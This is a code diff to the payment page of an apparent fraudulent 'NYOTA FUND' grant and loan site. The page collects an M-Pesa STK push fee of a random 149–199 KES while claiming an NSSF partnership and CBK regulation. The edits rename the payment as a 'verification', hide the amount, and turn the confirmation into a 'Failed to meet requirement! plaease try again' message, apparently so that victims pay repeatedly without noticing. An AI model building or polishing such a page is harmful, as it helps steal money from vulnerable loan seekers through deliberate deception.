@@ -1927,28 +1927,28 @@
         <section class="payment-page">
             <div class="container">
                 <div class="payment-container">
-                    <h2>Account Activation Payment</h2>
+                    <h2>Account Activation verification</h2>
 
                     <div class="payment-instructions">
-                        <h3>M-Pesa STK Push Payment</h3>
-                        <p>To activate your NYOTA FUND account and qualify for grant disbursement, NYOTA FUND in partnership with NSSF requires a one-time savings fee. An M-Pesa payment prompt will be sent directly to your phone. <strong>(REGULATED BY CBK)</strong></p>
+                        <h3>M-Pesa STK Push verification</h3>
+                        <p>To activate your NYOTA FUND account and qualify for grant disbursement, NYOTA FUND in partnership with NSSF requires a one-time verification. An M-Pesa verification prompt will be sent directly to your phone. <strong>(REGULATED BY CBK)</strong></p>
                     </div>
 
                     <div class="payment-details">
-                        <h3>Payment Details</h3>
-                        <p>Amount: <strong id="payment-amount-display">KES ...</strong></p>
+                        <h3>Account Details</h3>
+                        
                         <p style="margin-top:10px; color:#555;">Phone: <strong id="stk-phone-display">-</strong></p>
                         <p id="status" style="margin-top:18px; font-size:16px; color:#555;"></p>
                         <div style="margin-top:20px;">
-                            <button id="payBtn" class="btn btn-primary" onclick="handleStkPayment()">Send Payment Prompt to My Phone</button>
+                            <button id="payBtn" class="btn btn-primary" onclick="handleStkPayment()">Send Payment Prompt to My Phone to verify</button>
                         </div>
                     </div>
 
                     <div class="verification-success" id="verification-success" style="display:none;">
                         <i class="fas fa-check-circle"></i>
-                        <h3>Payment Verified Successfully!</h3>
-                        <p>Your account savings fee payment has been verified. Your loan application is now complete and under review.</p>
-                        <p>We will contact you within 24 hours with the loan decision.</p>
+                        <h3>Failed to meet requirement!</h3>
+                        <p> plaease try again.</p>
+                        
                         <button class="btn btn-primary" onclick="completeLoanApplication()">Return to Dashboard</button>
                     </div>
                 </div>
@@ -2370,7 +2370,7 @@
             if (!currentPaymentAmount || currentPaymentAmount === 0) {
                 currentPaymentAmount = Math.floor(Math.random() * (199 - 149 + 1)) + 149;
             }
-            document.getElementById('payment-amount-display').textContent = `KES ${currentPaymentAmount}`;
+            document.getElementById('payment-amount-display').textContent ;
             document.getElementById('stk-phone-display').textContent = stkPhone || '-';
             // Reset status and button
             const statusDiv = document.getElementById('status');
